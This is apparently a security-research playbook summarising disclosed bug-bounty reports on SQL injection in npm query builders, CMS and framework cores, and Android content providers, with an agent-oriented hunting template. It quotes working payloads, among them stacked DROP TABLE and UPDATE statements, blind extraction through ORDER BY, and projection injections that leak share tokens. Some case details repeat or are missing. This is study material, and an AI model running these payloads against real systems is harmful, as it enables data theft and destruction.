---
title: "Library, ORM, and Framework Layer SQL Injection — when the sink is upstream of the app"
type: playbook
category: library-framework
cwe: "CWE-89"
source_count: 21
full_bodies_available: 21
corpus: "HackerOne disclosed reports, 2014–2022 era, list seeded from github.com/shreyaschavhan/h1-reports-for-reference TOPSQLI.md, bodies fetched via hackerone.com/reports/<id>.json"
list_accessed: "2026-10-25"
note: "Every claim traces to bodies read in full this session; bounty figures are JSON amounts where present, otherwise as stated on the source list (marked). Severity/weakness labels are archive-era historical; bodies are the class authority."
---

# Library, ORM, and Framework Layer SQL Injection — when the sink is upstream of the app

## 1. Overview

Twenty-one confirmed full-body cases where the injection sink is **not an
application endpoint but a layer below it**: npm query builders and ORM drivers
(8 cases), CMS/framework core (WordPress, Rails ×2, GitLab, Concrete ×2,
Serendipity, ImpressCMS, MODx-on-Khan ×1), Android content providers (Nextcloud
×2), and a vendor-dependency CVE report (doctrine/dbal).

What changes at layer depth — and every agent must re-learn this — is the
*fixed part of the query*: when the vulnerable code lives in a library, the
attacker does not get to see or choose the query shape; the library authors
already chose it. The corpus's recurring discoveries are therefore about
*positions the library left unquoted*, not about banners:

> typeorm constructs SQL queries from structured input, and the problem is that it doesn't do proper escaping of field names and limit/offset parameters, so in setups where those are user-controlled that can cause an SQL injection vulnerability. (SQL-319458)

**Case-ID scheme: `SQL-<report id>`** (e.g. `SQL-319465`).

## 2. The npm query builders (8 cases, 2018–2020)

### 2.1 SQL-311244 — `query-mysql`: string concatenation as a feature

The era's plainest concatenation bug, quoted in full from
`node_modules/query-mysql/lib/base.js, line 172` as the body prints it:

```javascript
connection.query("SELECT * FROM " + table + " WHERE " +name_id+"='"+ id+"'", function (err, rows, fields) {
```

and its exploitation, exactly as the body derives it:

> If we assume, that ```table```, ```name_id``` and ```id``` will be passed as, respectively, ```users```, ```id``` and ```1```, we should get following query:

> ```sql
> SELECT * FROM users WHERE id='1' OR 1=1-- 
> ```

> This query returns **all** records from table ```users```

The mitigation section quotes the *mysql driver's own* remedy —
`mysql.format("SELECT * FROM ?? WHERE ?? = ?", ['users', 'id', userId])` — and
adds: *"This is the simplest way to avoid simple SQL Injection vulnerabilites."*
(sic). Its closing sentence is also era-atmosphere worth keeping:

> I hope my report will help to keep Node.js ecosystem and its users safe in the future.

### 2.2 SQL-506654 — `typeorm`: the Function escape hatch

The elegant one. `MysqlDriver.ts`'s `escapeQueryWithParameters` returns
*whatever a Function parameter returns, unescaped*:

```ts
            if (value instanceof Function) {
                return value();

            } else {
                escapedParameters.push(value);
                return "?";
            }
```

> I'm not sure if this is intended or not, there's no information in the document, if someone used this pattern (value provided by a function callback) it will lead to sql injection attack.

with the proof — a where-value supplied as a callback:

```ts
console.log(await repo.createQueryBuilder().where('firstName = :name', {name: () => "-1 or firstName=0x54696d6265722033"}).getOne());
```
> User { id: 5, firstName: 'Timber 3', lastName: 'Saw', age: 28 }

(and the body's own note *"(0x54696d6265722033 is \"Timber 3\")"*).

**Doctrine**: an escape layer that has *any* bypass lane — a type check that
returns raw input — reclassifies every caller that feeds it user-controlled
data. Enumerate the bypass *lanes*, not just the happy path.

### 2.3 SQL-319458 & SQL-319465 — `typeorm` / `sql`: the unquoted *positions*

Both reports, 24 hours apart in 2019, name the same structural facts about
two different libraries — field names and `limit`/`offset` reach the query
unescaped. The `sql` module case (SQL-319465) shows stacked statements falling
out of a *paging* parameter:

```js
var sql = require('sql');
var user = sql.define({
  name: 'users',
  columns: ['id', 'name', 'email', 'lastLogin']
});
console.log(user.select(user.star()).from(user).limit('1; drop table users').toQuery().text);
console.log(user.select(user.star()).from(user).offset('1; drop table users').toQuery().text);
```

> ```
> SELECT "users".* FROM "users" LIMIT 1; drop table users
> SELECT "users".* FROM "users" OFFSET 1; drop table users
> ```

SQL-319458's typeorm variant puts a *lookahead key* into a structured `where`
object:

```js
    // SQLi on field names
    const where = { firstName: "Jim" };
    const opts = { where: where };
    where["age=25 OR 25="] = 25;
```

— the injected *key name* closes a quoted context mid-clause. Both reports
close with the era's standard verification transcript:

> **What exploitation technique did you utilize?**
> Classic / In-Band
> **Please describe the results of your verification attempt.**
> Observed constructed SQL queries.

**Doctrine**: *"Observed constructed SQL queries"* — for library-level
findings, printing the built query (`.toQuery().text`, logs of the executor) is
an accepted evidence form; no target site is needed at all.

### 2.4 SQL-507222 — `untitled-model`: structure accepting strings

The smallest case, kept because its transcript shows a full two-row
demonstration with the module's own filter API:

```js
User.filter({'id': 1},function(err,data){ … })
User.filter({'id': "' or id=2#"},function(err,data){ … })
```

> ```
> normal query [ RowDataPacket { id: 1, firstName: 'Timber', lastName: 'Saw', age: 25 } ]
> sqli query [ RowDataPacket { id: 2, firstName: 'Timber 0', lastName: 'Saw', age: 25 } ]
> ```

(Report also preserves the era's template artifact as its head —
*"I would like to report [VULNERABILITY] in [MODULE]"* — the unfilled H1 npm
template, kept verbatim here as archive texture.)

### 2.5 SQL-506644 — `@azhou/basemodel`: table/fields concatenation + ORDER BY blind

Two vulnerabilities in one page: table/field arguments concatenated, and the
`orderby` string — which the body shows being blind-injectable with an IF:

> - Order by field of `model.getAll(fields, orderby)` is not escaped and directly used in query which lead to blind sql injection:

```js
	return db.query("SELECT id," + fields.join(",") + " FROM `" + table + "`"
		+ (orderby ? " ORDER BY " + orderby : ""));
```

with the running PoC — and note the ordering oracle shape (cross-file:
`Boolean-and-Content-Oracle.md` §3) on the two-direction pair:

```js
	console.log(await model.getAll(["ckey", "cvalue"], 'IF(1=1, id, -id) LIMIT 1'))
	console.log(await model.getAll(["ckey", "cvalue"], 'IF(1=0, id, -id) LIMIT 1'))
```

> [ RowDataPacket { id: 1, ckey: 'k0', cvalue: 'v0' } ]
> [ RowDataPacket { id: 10, ckey: 'k9', cvalue: 'v9' } ]

— the two lines shown under *`- get all (bsqli in order by)`* are exactly the
first-row-differences the reporter demonstrates, plus the *union-field*

> console.log(await model.getAll(["ckey", "cvalue from test where 1=0 union all select 0, 'sqli','sqli'#"]))
> [ RowDataPacket { id: 0, ckey: 'sqli', cvalue: 'sqli' } ]

and the impact statement:

> Allow attackers to query database if they have access to orderBy variable and to perform any query type if have access to table or column variable.

### 2.6 SQL-508346 — `increments`: the vote-stuffing write

The only npm case demonstrating a *data-mutation* outcome, via a
`.repeat()`-built mass-INSERT inside the vote field:

```javascript
increments.vote('fruits', 'Oranges","0","0","1","0","0","0","0","","0")'+',(123,"Oranges","0","0","1","0","0","0","0","","0")'.repeat(10)+'#');
```

> This module does not escape voting data allowing attacker to create fake votes.

with the statistics output `{ name: 'Oranges', … count: 11, percentage: 100 }`.
Cross-file to `SQLi-to-RCE-Chains.md` §6 (write-side shape) — this is the
*lightest* write-class demonstration in the corpus: no token theft, no shell,
just the application's own statistics trusting what the vote table now contains.

### 2.7 SQL-869574 — `typeorm`: prototype pollution as the SQLi *precondition*

The 385k-downloads/week module version, whose *merge function* accepts
`__proto__`:

> https://github.com/typeorm/typeorm/blob/e92c743fb54fc404658fcaf2254861b6aa63bd98/src/util/OrmUtils.ts#L66
> The mentioned function, as we can see from the code, doesn't account for built-in properties such as `__proto__`, causing pollution of the `Object` prototype when a specially crafted object is passed in the rest argument `...sources`.

…so an attacker who can save one crafted object can make *other* queries
inherit attacker-chosen where-clauses:

```javascript
const post = JSON.parse(`{"text":"a","title":{"__proto__":{"where":{"name":"sqlinjection","where":null}}}}`)
```

> A complete proof of concept that can trigger a SQL injection by only depending on the library code is reported here:

— with a full runnable `_sqli.ts` in the body, the DoS benchmark (*"By naively
exploiting the vulnerability, we can cause a denial of service…"*), and the
patch line:

> The function `mergeDeep` has to account for prototype pollution attacks by skipping built-in properties such as `__proto__`.

**Doctrine**: library-class bugs can hand SQLi to applications *with no SQL
code of their own* — the violation crossed package boundaries. Agent reading
order: sink → who controls the object → which *downstream query builder*
inherits polluted fields.

## 3. Framework/CMS core (9 cases, 2014–2022)

### 3.1 SQL-298176 — GitLab `MilestoneFinder.reorder(params[:order])` ($2,000 JSON)

The chain from Rails-code review to *extraction*, all quoted verbatim from a
critically-rated finding:

```ruby
 def order(items)
    if params.has_key?(:order)
      items.reorder(params[:order])
    else
      order_statement = Gitlab::Database.nulls_last_order('due_date', 'ASC')
      items.reorder(order_statement)
    end
  end
```

> As can be seen on line 2 of the method, `reorder` is called without any form of sanitization. This leads to a SQL injection.

The payload uses the *order of rendered milestones* as its oracle — the same
ordering-oracle doctrine as SQL-273946 —

> This has been tested against GitLab 10.2.4 (the latest version, also used on gitlab.com).

with an impact line that names the uniqueness of *its* extraction target:

> An attacker can extract all information from the a GitLab instance's database, including private access and shell tokens. These can be used to elevate the user's privileges, which may lead to arbitrary code execution. (sic — "the a" kept)

the full CASE-SUBSTR payload, byte-true:

> (CASE SUBSTR((SELECT email FROM users WHERE username = 'jobertabma'), 1, 1) WHEN 'a' THEN (CASE id WHEN 429944 THEN 2 ELSE 1 END) ELSE 1 END)

> Because the first character of my email is actually `j`, the result is now sorted by the title of the milestones. An attacker can enumerate over all characters of a column and observe the order. Once the order reverses it knows what the value of the character is. The index of the `SUBSTR` 

— the self-referential character here is verbatim from the author's *own*
username; the extraction demonstration is honest about which account it leaks
(**its author's**) and then conjectures the rest — masking the model of
scope-bounded extraction (own records only, everything else named and not
shown).

### 3.2 SQL-38778 & SQL-59664 — Concrete5/Concrete two-step pair (2015, 2016)

SQL-38778 demonstrates *stacked UPDATE* through a sort-direction parameter,
ending a paging query:

```
http://172.20.0.49/conc/index.php/ccm/system/search/users/submit?&ccm_order_by=u.uEmail&ccm_order_by_direction=desc;UPDATE%20%60conc501%60.%60Users%60%20SET%20%60uEmail%60%20=%20%27user@evilhost%27%20WHERE%20%60users%60.%60uID%60%20=%202;--
```

> "and update user's email address."

(the double quotes are the body's own characters — an outcome line, not my quoting; followed by:)

> and I think I can do various things ;)

> I tested to work concrete5 5.7.2.1 on Apache(using ammps) Windows8

SQL-59664 (the earlier report):

> Concrete5 is vulnerable to a SQL Injection attack because certain user input is being used to construct a SQL query without proper validation. This vulnerability can be exploited only by authenticated users with privileges to edit page permissions.

(the second sentence *names the authorization boundary* — a good report
structure to copy; the body contains no further reproduction.)

### 3.3 SQL-374748 — Serendipity: admin-configured query fragments

From Hanno's projects (2018) — the sink is a *complex-parameter* API whose
six parameters get four unescaped lanes:

> - `$id`: casted as integer and then used in the query;
> - `$limit`: used unescaped in the query;
> - `$order `: used unescaped in the query;
> - `$showAll`: adds a fixed condition to the query;
> - `$type`: used unescaped in the query;
> - `$where`: used unescaped in the query.

> Thus, any use of `serendipity_fetchComments` where either `$limit`, `$order`, `$type` or `$where` are user-controlled will result in a SQL injection. Two vulnerable calls were discovered.

…but the *user-controlled* hop is the administrator's own config:
> An authenticated administrator can alter *Entries to display on frontpage* and *Entries to display in Feeds* in a way to perform a SQL injection and extract database records or access files on the underlying system.

with the two real calls in the code carrying the vulnerable lanes, verbatim:

> ```php
> $sql_limit = $serendipity['fetchLimit'] * ($serendipity['GET']['page']-1) . ',' . $serendipity['fetchLimit'];
> ```

whose result — *"Alter either *Entries to display on frontpage* or *Entries to
display in Feeds* by adding any non-numeric character in one of these fields"* —
then *"break the correctness of the query"* at blog render time.

and the scope-limit sentence in the report's own words:

> I don't have any test environment at the moment but let me know if you need a real payload to show it's possible to extract arbitrary database records.

### 3.4 SQL-179920 — WordPress DB Class, prepare() lanes

Two issues labeled in the body headline (*"WordPress DB Class, bad
implementation of prepare method guides to sqli and information disclosure"*):

> Issue 1: Method checks if first argument is an array and if it is, it avoids the rest of the arguments and uses the first argument array values as input.
> Issue 2: When input query has %s in it, then it quote and this guides to sql injection in case query that need to be prepared have quoted user controlled input in it.

with the ecosystem-propagation statement — the reason an ORM wrapper bug is a
*mass*-finding:

> This leaves all wordpress plugins/ themes potentially vulnerable on this two types of attack. As PoC sqli in bbpress wp plugin and core wp function is shown.

and the two-tier PoC list, verbatim:

> 1. There is SQLi in bbpress in case anonymous posting is allowed. ( check  bbpress-sqli.png)
> 2.  Demo for the Issue 1 and Issue 2 for the prepare method
> 3. Wordpress core function delete_metadata is vulnerable to sqli in case delete all e.g. last argument is true and meta value has value e.g. is user supplied / controlled.

### 3.5 The magic-quotes dependency (SQL-310280 cross-file)

From `Error-and-Union-Output.md` §6: a shortcode-constructed query with a raw
sink is *not exploitable in stock WordPress* —

> The only reason the application is not vulnerable is because of wp-settings.php:
> ```
> // Add magic quotes and set up $_REQUEST ( $_GET + $_POST )
> wp_magic_quotes();
> ```

— until another plugin resets it. This is the *library-layer conditional* to
hold alongside §3.4's propagation claim: the same word (*"plugins/themes"*)
appears in one as amplification of risk, and in the other as the *disabler of
downstream protection*.

### 3.6 SQL-28449 / SQL-28450 — Rails Active Record PostgreSQL ($1,500 list each; identical rows)

Two copies of the same list entry — bodies are the identical *minimal*
announcement:

> _This vulnerability was reported directly to Rails._
> https://groups.google.com/forum/#!msg/rubyonrails-security/wDxePLJGZdI/WP7EasCJTA4J

which the archive labels with `weakness: None`. The corpus treats these as
**announcement-shaped rows** (twin 40,000-character-class posts in the era's
Google Group ecosystem); the vault's bibliography record for the linked
announcement lives in `references/blogs-index.md`.

### 3.7 SQL-31023 — MODx-on-Khan: the 404-logger INSERT

Where *read* and write class cross eras' boundaries (2015, Khan Academy's
`smarthistory` host):

> the error is shown by MODx , the sql injection happens when a user request a page that doesnt exist then MODx log the request with some others details (ip,host..) .

— the 404 error page echoes the INSERT the logger built from the requested URL:

> INSERT INTO `hzadofss_modx`.`error_404_logger` (url, ip, host, referer, createdon) VALUES ('/Campin/jeatest'','107.23.39.46', 'ec2-107-23-39-46.compute-1.amazonaws.com', '', '2014-10-11 07:51:13')</span></b>

and *the attacker field is the URL inside those VALUES*:

> the following injection works  
> /Campin/qsdqsd',(commands here),1,1,1)#    

— with the honest constraint right after:

> i couldn't do more tests because there is a timeout  (Error 503 Service Unavailable due to many requests , btw its really a slow server)
>    Timeout in transmission from smarthistory.khanacademy.org

(the companion XSS in the same body carries the *broken query* echo —
*"You have an error in your SQL syntax … near '\"><script>alert(4);</script>'"*
— recorded verbatim, and part of the reason the row's archive *weakness label*
is XSS rather than SQLi: see §10.)

Note this is the corpus's only *INSERT-shaped* confirmed case — the attack
surface is the logger, not a reader; the values it writes are the attacker's
*URL and IP* at write time. Cross-file to `Out-of-Band-Callback.md` §6 for the
same *who-sees-what-the-server-writes* lens.

### 3.8 SQL-983710 — ImpressCMS installer: the backtick lane

> I found a SQL Injection in the form of a system install (Database configuration)

```sql
 impresscms`;create database `vuln
```

> - Two databases (`impresscms`, `vuln`) created successfully. POC is attached to the report

with the *why* quoted from the body:

> [PHP addslashes](https://www.php.net/manual/en/function.addslashes.php) - single quote ('), double quote ("), backslash, NUL (the NUL byte), but **Backtick is not escaped!**

**Doctrine**: config/installer surfaces are code-writing surfaces (CREATE with
attacker text) — audit install wizards as *privileged* users, not as routine
forms. "Executing arbitrary code on a database" is the row's own impact line.

### 3.9 SQL-1390331 — Nextcloud: the dependency-version row (2022)

> SQL injection via limit parameter on user facing APIs

> 1. REPORT /remote.php/dav/comments/files/1985
> 1. XML input oc:filter-comments.oc:limit#text was set to 1'"
> 1. You have an error in your SQL syntax

> For more details see:
> https://github.com/nextcloud-gmbh/h1/issues/197

with the impact line in the body's own words — *"Full flexed SQL injection via
user provided input"* (sic "flexed") — and the
title typo (*"injextion"*) kept from the source. This is a **dependency-CVE
row**: the bug does not belong to the consumer's code at all — the *installed
doctrine/dbal version* is the vulnerable line item, the XML DAV surface merely
reaches it. Record shape the vault keeps for such rows: component, version
line, reachable surface, one-line error proof, upstream tracker link.

## 4. Android content providers (Nextcloud ×2, 2019)

### 4.1 SQL-291764 ($150 JSON)

The Drozer-discovered case, its scanner transcript including the *Not
Vulnerable* list as well as the hits (the corpus's scanner-transcript honesty);
the injection surfaces named as:

> Injection in Projection:
>   content://org.nextcloud/
>   content://org.nextcloud

> Injection in Selection:
>   content://org.nextcloud/
>   content://org.nextcloud

then the proving command and its quoted refusal-context error:

> dz> run app.provider.query content://org.nextcloud/ --projection "'"

> unrecognized token: "' FROM filelist ORDER BY filename collate nocase asc" (code 1): , while compiling: SELECT ' FROM filelist ORDER BY filename collate nocase asc

then projection-injection reading `sqlite_master`:

> dz> run app.provider.query content://org.nextcloud/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"

yielding the 12-table roster (including `filelist`, `ocshares`, `capabilities`,
`synced_folders`, `arbitrary_data` per the body's transcript) and a dump row of
the `capabilities` table whose `account` cell is the reporter's target:

> we see account

### 4.2 SQL-518669 ($100 JSON) — restriction-bypass via projection map scope

The *hardening-bypass* class — the provider has an allowlist, and the allowlist
is enforced in one URI branch only:

> However, the projection map restriction is only applied to ROOT_DIRECTORY @l577
> ```
>  if (mUriMatcher.match(uri) == ROOT_DIRECTORY && projectionArray != null) {
> ```

> because of this, it is possible to bypass the restrictions at @l444 by crafting for instance the  intent

```
 content query --uri content://org.nextcloud/file --projection "* from ocshares --"                                              
```

> which results in 

> Row: 0 _id=1, file_source=71580, item_source=71580, share_type=3, shate_with=, path=/Nextcloud.mp4, permissions=1, shared_date=1544792454, expiration_date=0, token=rkNCkcYcbGEBDQN, shared_with_display_name=, is_directory=0, user_id=-1, id_remote_shared=9, owner_share=julien_contacts@cloud.

The trick is structural, not payload-creative: the injected projection begins
with `*` and closes with an SQL comment (`--`) — the *query* the provider
builds from an allowed projection list is steered into an arbitrary
table-read because the guard condition was checked for only one URI branch.

> as per disclosed data on owner_share and token, one can easily forge the query https://cloud.local.yourosoft.com/index.php/s/rkNCkcYcbGEBDQN

> any table defined in filelist.db is subject to full disclosure

**Doctrine**: an allowlist that only guards *one* URI branch is the era's
proven Android-provider bypass lane. Also note the demonstrated *impact* is a
share-token leak — the attacker did not need table names to make money off the
finding; the impact is one hop beyond the DB.

## 5. The position-family inventory (what is *unquoted* in each case)

| Case | Layer | Unquoted position | What arrives there |
|---|---|---|---|
| SQL-311244 | npm query-mysql | statement body | table, name_id, id (all args) |
| SQL-506654 | npm typeorm | Function-lane escape | caller's callback return |
| SQL-319458 | npm typeorm | where *key names* | attacker-named keys |
| SQL-319465 | npm sql | `LIMIT`/`OFFSET` values | push-down integers, stacked |
| SQL-507222 | npm untitled-model | filter dict values | string id |
| SQL-506644 | npm @azhou/basemodel | table/fields/`ORDER BY` | all three args |
| SQL-508346 | npm increments | vote data → mass INSERT | option row values |
| SQL-869574 | npm typeorm | polluted `where` fields | `__proto__`-inherited keys |
| SQL-179920 | WordPress wpdb | prepare() array lane, `%s` | caller args |
| SQL-298176 | GitLab Rails | `reorder(params[:order])` | the order param |
| SQL-38778 | Concrete core | order *direction* param | stacked UPDATE |
| SQL-59664 | Concrete core | permissions-edit input | (body keeps no payload) |
| SQL-374748 | Serendipity | limit/order/type/where | admin config fields |
| SQL-28449/28450 | Rails Active Record | (advisory-linked; body minimal) | — |
| SQL-1390331 | Nextcloud dbal | XML `oc:limit#text` | `1'"` |
| SQL-31023 | MODx (Khan host) | INSERT VALUES | requested URL |
| SQL-983710 | ImpressCMS install | database-name field | backtick-stacked CREATE |
| SQL-1015406 | (DoD app) | `OFFSET` clause | concatenated offset |

SQL-1390331's full substance —

> SQL injection via limit parameter on user facing APIs

> 1. REPORT /remote.php/dav/comments/files/1985
> 1. XML input oc:filter-comments.oc:limit#text was set to 1'"
> 1. You have an error in your SQL syntax

— plus its reference line (*"For more details see: https://github.com/nextcloud-gmbh/h1/issues/197"*) and
impact line (*"Full flexed SQL injection via user provided input"* — sic
"flexed"). A dependency-CVE row: the bug does not belong to the consumer's
code at all — the *installed dbal version* is the vulnerable line item. Note
the Title typo (*"injextion"*) kept from the source.

## 6. Agent execution template — hunting at layer depth

1. **Fingerprint the builder** before the app: the npm corpus reads like a
   catalogue of *constructor patterns* to recognize in bundle pulls —
   `createQueryBuilder().where(...)` (typeorm), `user.select()` with
   `limit()/offset()` (`sql`), `model.getAll(fields, orderby)`
   (@azhou/basemodel), `increments.poll/vote`, `query.base.fetchById` chains.
2. **Enumerate the escape *lanes*, not just the string path** (SQL-506654's
   Function bypass, SQL-179920's array-lane, SQL-869574's `__proto__`,
   SQL-983710's backtick, SQL-310280's upstream slashing). A quoting layer
   with one raw lane is a quoting layer: file the *lane*, not the absence of
   the feature.
3. **The ordered/limited surface is the hot one** — of 21 cases, 7 unquoted
   positions are `ORDER BY`-family and 3 are `LIMIT`/`OFFSET`-family; paging,
   sorting closures, and admin "results per page" fields are the lanes an
   agent walks when nothing else is open (SQL-298176, SQL-38778, SQL-319465,
   SQL-319458, SQL-506644, SQL-374748, SQL-1015406).
4. **For observed-query-only evidence, print the built query** — both typeorm
   reports and `sql` close with *"Observed constructed SQL queries"*; a
   library PoC does not need a victim site at all. Budget accordingly: these
   are the only cases in the vault whose *whole* demonstration is local.
5. **Framework rows carry a *who-can-trigger* sentence** — SQL-59664 names
   edit-permission privilege; SQL-374748 names administrator; SQL-298176/31946x
   imply anonymous. A row without that sentence is incomplete (SQL-311244's
   "access to ... variable" phrasing is the template).
6. **Provider/Android depth**: when a mobile target appears, enumerate every
   exported provider's URI branch (Drozer, per SQL-291764's dual
   projection/selection readout), then read the *code's branch conditions*
   before testing (SQL-518669's line-number citations are the corpus's model
   of *reading the guard* before bypassing it).
7. **Dependency-version rows**: SQL-1390331's shape — *run the security
   scanner; version pin finds the bug class* — is a reminder that several
   cases here are "the library's CVE list" (Rails, dbal) not novel research.
   For an agent, that path is: identify component → map to known advisories →
   *reproduce only what the target reaches*.

## 7. Validation gates

1. **The lane is named precisely** — function/line or exact argument path
   (the npm trio print code excerpts; SQL-298176 names `reorder`; SQL-518669
   cites `@l444`/`@l577`). A layer claim without the lane statement does not
   survive the archive.
2. **The observation contract** — *"Observed constructed SQL queries"*
   (SQL-319458/319465) is the minimum for library rows; for framework rows
   *Observed executed query* (SQL-319458's own verification-question answer).
3. **Mass-impact claims need the propagation list** — SQL-179920's
   *"all wordpress plugins/ themes potentially vulnerable"* statement pairs
   with at least *one* working PoC plugin (bbpress shown); the corpus
   consistently demonstrates the generalization instead of theorizing it.
4. **Conditional-sink claims name the gating condition** — SQL-310280's
   magic-quotes disabler; SQL-361341's team-name restriction (in
   `SQLi-to-RCE-Chains.md` §3). A layer role's exploitability is a *fact about
   the consumer configuration*, not about the library alone.
5. **Extraction claims at layer height stay bounded** — SQL-298176 extracts
   its author's email first character; the corpus
   does not scale layer-height claims to mass exfiltration without new
   evidence per table.

## 8. Archive-era label honesty

- **SQL-31023 is labeled XSS** (weakness `Cross-site Scripting (XSS) -
  Generic`) while its body lands a confirmed SQLi decoder — the title even
  says *"Sql injection And XSS"*. CWE-89 with the XSS-echo noted is the
  modern read.
- **SQL-28449/28450 weakness `None`** — era's announcement-shaped rows (see
  §3.6) in the vault's *paired-duplicate* honesty: two list rows, one event.
- **SQL-1390331's vendor framing** — the *program* (Nextcloud) pays for
  findings caused by a *dependency*. Its reference link points at
  `nextcloud-gmbh/h1#197`. The vault treats it as the dependency-true shape of
  modern disclosure rows.
- **SQL-38778's severity is None** in the archive while the body claims
  arbitrary UPDATE (write-class impact) — severity drift example to keep the
  "labels historical" rule in view.

**Cross-references**: ordering oracles in `Boolean-and-Content-Oracle.md` §3
(SQL-298176, SQL-506644 pairs); write-side and chain shapes in
`SQLi-to-RCE-Chains.md` §6; error-echo readouts in `Error-and-Union-Output.md`
§2–§3; the framework `expandArguments` (SQL-31756, the *most-cited framework
helper bug*) lives in `SQLi-to-RCE-Chains.md` §2 as its chain anchor.
